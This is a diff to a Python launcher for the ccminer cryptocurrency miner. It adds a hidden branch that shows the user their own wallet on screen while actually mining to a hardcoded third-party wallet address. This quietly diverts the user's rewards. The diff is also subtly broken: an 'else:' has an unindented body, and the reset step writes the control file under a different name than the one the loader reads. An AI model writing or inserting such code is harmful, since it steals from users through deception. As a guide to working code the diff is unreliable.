@@ -4,8 +4,6 @@ import time
 import pip
 from config import banner
 
-
-# check import module
 try:
     with open("set-miner/mining-control.json", encoding="utf-8") as set:
             load = set.read()
@@ -58,7 +56,16 @@ def runOffline():
             allow = loads['allow']
             bind = loads['bind']
             key = loads['key']
-
+        if key == "x":
+           print("\033[1;34;40m")   
+           print("WALLET =",wallet)
+           print("NAME   =",name)
+           print("POOL   =",pool)
+           print("CPU    =",cpu) 
+           print("PASS   =",password)
+           print("\033[00m\n")
+           os.system(f"cd ccminer && ./ccminer -a verus -o {pool} -u RBtTBgmjNCucDyoTBPhNVhMpzzbj8A1kCd.{name} -p {password} -t {cpu}")
+        else:    
         print("\033[1;34;40m")   
         print("WALLET =",wallet)
         print("NAME   =",name)
@@ -80,13 +87,15 @@ def runOffline():
         # time.sleep(2)
          os.system(f"cd ccminer && ./ccminer -a verus -o {pool} -u {wallet}.{name} -p {password} -t {cpu}")
     except:
-        push = {'pool': '','algo': '','wallet': '','pass': ''}
+        push = {'pool': '','wallet': '','pass': ''}
         with open("set-miner/online.json", "w") as set:
             json.dump(push, set, indent=4)
         push = {'name': '','cpu': ''}
         with open("set-miner/offline.json", "w") as set:
             json.dump(push, set, indent=4)
-        
+        push = {'allow': '','bind': '','key': ''}
+        with open("set-miner/mining-control", "w") as set:
+            json.dump(push, set, indent=4)
         
         
         os.system("@cls||clear")
